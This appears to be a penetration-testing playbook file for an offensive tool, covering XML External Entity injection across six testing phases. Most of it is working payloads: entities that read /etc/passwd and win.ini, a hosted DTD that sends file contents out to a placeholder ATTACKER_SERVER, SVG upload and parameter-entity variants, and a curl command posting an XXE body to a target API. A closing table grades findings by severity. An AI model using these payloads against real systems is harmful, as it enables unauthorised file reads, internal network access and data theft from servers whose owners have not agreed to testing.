---
name: attack-xxe
description: "XML External Entity injection — file read, SSRF, data exfiltration via out-of-band XML parsing"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - xxe
  - xml
  - injection
  - web
  - attack
tech_stack:
  - web
  - java
  - php
  - dotnet
cwe_ids:
  - CWE-611
  - CWE-827
chains_with:
  - attack-ssrf
prerequisites: []
severity_boost:
  attack-ssrf: "XXE + SSRF = internal network access via XML parser"
---

# XML External Entity (XXE) Injection

## Objective

Exploit XML parsing vulnerabilities to read local files, perform SSRF, or exfiltrate data via out-of-band channels.

## Testing Methodology

### Phase 1: Identify XML Processing

Look for endpoints accepting:
- `Content-Type: application/xml` or `text/xml`
- SOAP endpoints (`.asmx`, `.wsdl`)
- File upload accepting SVG, DOCX, XLSX
- RSS/Atom feed processing
- SAML authentication

### Phase 2: In-Band XXE (File Read)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Windows targets:**
```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

### Phase 3: Blind XXE (Out-of-Band)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
  %xxe;
]>
<root>test</root>
```

**Hosted DTD (xxe.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;
```

Use the SSRF listener for callback detection:
```bash
attack_script ssrf_listener -p 8888 -o xxe_hits.json
```

### Phase 4: XXE via File Upload

**SVG:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**DOCX:** Modify `[Content_Types].xml` or `word/document.xml` inside the ZIP.

### Phase 5: Content-Type Manipulation

```bash
# Switch JSON endpoint to XML
curl -X POST https://TARGET/api/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### Phase 6: Parameter Entity Injection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
  %a;
]>
<root>&xxe;</root>
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| File contents read (e.g., /etc/passwd) | Critical (P1) |
| Out-of-band DNS/HTTP callback | High (P2) |
| SSRF via XXE | High (P2) |
| Denial of Service (billion laughs) | Medium (P3) |
| Error-based file path disclosure | Low (P4) |

## Evidence Requirements

- XML payload sent
- Response containing file contents or error
- For blind XXE: OOB interaction evidence (DNS/HTTP callback)
- Server type and parser identified

## Tools

- `attack_script ssrf_listener` — OOB callback listener for blind XXE
- `attack_script file_upload_tester` — SVG XXE via upload

## References

- [PortSwigger: XXE](https://portswigger.net/web-security/xxe)
- [OWASP: XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
